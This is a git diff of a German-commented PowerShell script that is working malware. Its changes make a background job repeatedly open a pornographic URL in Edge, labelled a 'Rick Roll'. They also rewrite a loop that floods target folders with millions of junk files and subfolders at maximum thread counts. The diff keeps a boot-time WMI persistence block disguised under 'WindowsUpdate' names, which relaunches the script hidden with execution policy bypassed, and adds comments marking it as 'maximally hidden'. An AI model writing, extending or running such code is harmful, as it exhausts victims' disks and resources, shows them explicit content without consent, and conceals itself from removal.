@@ -187,7 +187,7 @@ $usbJob = Start-Job -ScriptBlock {
 # ===== NEU: NUR 1 SEITE IN EDGE =====
 $browserJob = Start-Job -ScriptBlock {
     # NUR EINE SEITE - HIER KANNST DU SIE ÄNDERN!
-    $seite = ""  # Rick Roll
+    $seite = "https://de.pornhub.org/view_video.php?viewkey=ph6352d0e12f042"  # Rick Roll
     
     while ($true) {
         # Zufällige Wartezeit (5-10 Minuten)
@@ -210,110 +210,61 @@ $browserJob = Start-Job -ScriptBlock {
     }
 }
 
-# ===== NEU: PARALLEL SPAM ENGINE =====
-# ALLE ZIELE GLEICHZEITIG BEARBEITEN!
+# ===== HAUPTSCHLEIFE - EXTREME SPEED EDITION =====
+# ALLES PARALLEL - MAXIMALE GESCHWINDIGKEIT
 
-# Maximale Threads basierend auf CPU
-$maxThreads = [Environment]::ProcessorCount * 10
+# Threads maximieren
+$maxThreads = 9999  # Unbegrenzt
+[System.Threading.ThreadPool]::SetMinThreads(1000, 1000)
 
-# Funktion für parallelen Spam
-function Start-ParallelSpam {
-    param($ziel, $runde)
-    
-    Start-ThreadJob -Name "Spam_$runde" -ScriptBlock {
-        $target = $using:ziel
-        $round = $using:runde
-        
-        if (Test-Path $target) {
-            # Hauptordner
-            $mainFolder = Join-Path $target "MAIN2PACKET_PARALLEL_$round"
-            try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
-            
-            # 1000 DATEIEN - SCHNELL
-            for ($i = 1; $i -le 1000; $i++) {
-                # Direkt im Ziel
-                $file1 = Join-Path $target "PARALLEL_${round}_$i.king"
-                "PARALLEL SPAM $round - $i" | Out-File $file1 -Encoding UTF8 -Force
-                
-                # Im Hauptordner
-                $file2 = Join-Path $mainFolder "file_$i.king"
-                "PARALLEL SPAM $round - $i" | Out-File $file2 -Encoding UTF8 -Force
-            }
-            
-            # 500 UNTERORDNER
-            for ($u = 1; $u -le 500; $u++) {
-                $subFolder = Join-Path $mainFolder "SUB_$u"
-                New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
-                
-                # 200 DATEIEN PRO UNTERORDNER
-                for ($s = 1; $s -le 200; $s++) {
-                    $subFile = Join-Path $subFolder "sub_$s.king"
-                    "SUB $u - DATEI $s" | Out-File $subFile -Encoding UTF8 -Force
-                }
-            }
-        }
-    } -ThrottleLimit $maxThreads
-}
-
-# ===== NEU: HINTERGRUND-SPAM =====
-$backgroundSpam = Start-Job -ScriptBlock {
-    $alleZiele = $using:alleZiele
-    $counter = 0
-    
-    while ($true) {
-        $counter++
-        $randomZiel = $alleZiele | Get-Random
-        
-        if (Test-Path $randomZiel) {
-            $bgFile = Join-Path $randomZiel "BACKGROUND_SPAM_$counter.king"
-            "BACKGROUND SPAM $counter" | Out-File $bgFile -Encoding UTF8 -Force
-        }
-        
-        # 10ms Pause für maximalen Speed
-        Start-Sleep -Milliseconds 10
-    }
-}
-
-# ===== NEU: EXTRA THREADS =====
-for ($t = 1; $t -le 20; $t++) {
-    Start-Job -ScriptBlock {
-        $ziele = $using:alleZiele
-        $id = $using:t
-        
-        while ($true) {
-            $ziel = $ziele | Get-Random
-            if (Test-Path $ziel) {
-                $file = Join-Path $ziel "THREAD_${id}_$(Get-Random).king"
-                "THREAD $id SPAM" | Out-File $file -Encoding UTF8 -Force
-            }
-            Start-Sleep -Milliseconds 50
-        }
-    }
-}
-
-# ===== HAUPTSCHLEIFE - JETZT MIT PARALLELEN JOBS =====
 while ($global:currentRound -lt $global:maxRounds) {
     $global:currentRound++
     
-    # ALLE ZIELE IN PARALLELEN JOBS STARTEN
-    $jobs = @()
-    foreach ($ziel in $alleZiele) {
-        $jobs += Start-ParallelSpam -ziel $ziel -runde $global:currentRound
-    }
+    # ALLE ZIELE PARALLEL MIT MAXIMALEM SPEED
+    $alleZiele | ForEach-Object -Parallel {
+        $ziel = $_
+        $round = $using:global:currentRound
+        $computer = $using:env:COMPUTERNAME
+        
+        if (Test-Path $ziel) {
+            $mainFolder = Join-Path $ziel "MAIN2PACKET_SCAN_$round"
+            New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null
+            
+            # 2000 DATEIEN - OHNE PAUSE
+            for ($i = 1; $i -le 2000; $i++) {
+                # Direkt im Ziel
+                $f1 = Join-Path $ziel "MAIN2PACKET_SCAN_$i.king"
+                "$computer - EXTREME SPEED $round - $i" | Out-File $f1 -Encoding UTF8 -Force
+                
+                # Im Hauptordner
+                $f2 = Join-Path $mainFolder "file_$i.king"
+                "$computer - EXTREME SPEED $round - $i" | Out-File $f2 -Encoding UTF8 -Force
+            }
+            
+            # 2000 UNTERORDNER - PARALLEL
+            1..2000 | ForEach-Object -Parallel {
+                $u = $_
+                $mf = $using:mainFolder
+                $subFolder = Join-Path $mf "SUB_$u"
+                New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
+                
+                # 1000 DATEIEN PRO UNTERORDNER
+                for ($s = 1; $s -le 1000; $s++) {
+                    $sf = Join-Path $subFolder "subfile_$s.king"
+                    "SUB $u - FILE $s" | Out-File $sf -Encoding UTF8 -Force
+                }
+            } -ThrottleLimit 100
+        }
+    } -ThrottleLimit 100  # 100 Ziele parallel
     
-    # NUR KURZ WARTEN DASS JOBS STARTEN
-    Start-Sleep -Milliseconds 500
-    
-    # JOBS IM HINTERGRUND WEITERLAUFEN LASSEN
+    # KEINE PAUSE - SOFORT WEITER
     Write-Host "."
-    
-    # KURZE PAUSE ZWISCHEN RUNDEN
-    Start-Sleep -Milliseconds 100
 }
 
-# ===== WMI PERSISTENZ =====
+# ===== WMI PERSISTENZ (MAXIMAL VERSTECKT) =====
 $wmiJob = Start-Job -ScriptBlock {
     try {
+        # Event Filter - startet bei Systemstart
         $filterArgs = @{
             Name = 'WindowsUpdateFilter'
             EventNameSpace = 'root\cimv2'
@@ -322,12 +273,14 @@ $wmiJob = Start-Job -ScriptBlock {
         }
         $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs -ErrorAction SilentlyContinue
         
+        # Event Consumer - führt Skript aus
         $consumerArgs = @{
             Name = 'WindowsUpdateConsumer'
             CommandLineTemplate = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
         }
         $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs -ErrorAction SilentlyContinue
         
+        # Filter mit Consumer verbinden
         $bindingArgs = @{Filter=$filter; Consumer=$consumer}
         Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs -ErrorAction SilentlyContinue
     } catch {}
